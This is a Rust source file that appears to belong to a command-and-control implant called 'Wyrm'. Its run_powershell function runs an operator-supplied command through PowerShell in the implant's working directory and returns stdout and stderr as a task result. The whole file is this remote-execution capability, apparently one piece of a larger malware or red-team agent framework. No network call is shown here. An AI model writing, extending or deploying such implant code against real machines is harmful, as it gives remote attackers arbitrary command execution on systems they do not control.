use std::process::Command;

use serde::Serialize;
use shared::tasks::PowershellOutput;

use crate::wyrm::Wyrm;

pub fn run_powershell(command: &Option<String>, implant: &Wyrm) -> Option<impl Serialize + use<>> {
    let command = command.as_ref()?;

    let output = Command::new("powershell")
        .arg(command)
        .current_dir(&implant.current_working_directory)
        .output()
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    let stdout = if stdout.is_empty() {
        None
    } else {
        Some(stdout)
    };

    let stderr = if stderr.is_empty() {
        None
    } else {
        Some(stderr)
    };

    Some(PowershellOutput { stdout, stderr })
}
